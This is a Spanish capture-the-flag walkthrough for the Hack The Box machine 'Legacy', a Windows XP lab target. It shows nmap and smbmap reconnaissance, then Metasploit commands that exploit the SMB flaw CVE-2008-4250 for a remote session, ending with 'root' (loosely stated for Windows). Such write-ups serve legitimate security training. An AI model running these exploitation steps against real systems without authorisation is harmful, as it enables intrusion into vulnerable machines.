---
description: '✍️ Autor: ch4p 🔍 Dificultad: Fácil 📅 Fecha de creación: 10/10/2017'
---

# Legacy

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.4
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.4
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 135 (MS RPC):** Este puerto es utilizado para la comunicación de servicios como DCOM y MSRPC. Puede ser vulnerable a exploits si no está debidamente asegurado. Puedes buscar si hay alguna versión vulnerable de MSRPC, como las que se vieron con ataques como MS08-067.
* **Puerto 139 y 445 (SMB):** Ambos puertos están asociados a servicios de compartición de archivos y recursos en redes Windows. Los vectores de ataque conocidos incluyen ataques de SMB Relay y exploits como EternalBlue (CVE-2017-0144). Es recomendable realizar un escaneo de vulnerabilidades para verificar si estos puertos son accesibles desde fuera y si están expuestos a vulnerabilidades conocidas.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p135,139,445 -v 10.10.10.4
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Miramos el protocolo SMB.

```bash
smbmap -H 10.10.10.4
```

No vemos nada. Revisamos si tiene un CVE.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Al ser un Windows XP y revisando por internet encontramos que hay un **CVE-2008-4250** por lo que abrimos Metasploit para explotarlo.

```bash
search CVE-2008-4250
use 0
show options
set RHOSTS 10.10.10.4
set LHOST 10.10.14.7
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
getuid
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Somos **root**.

<figure><img src="../../.gitbook/assets/image (1232).png" alt=""><figcaption></figcaption></figure>
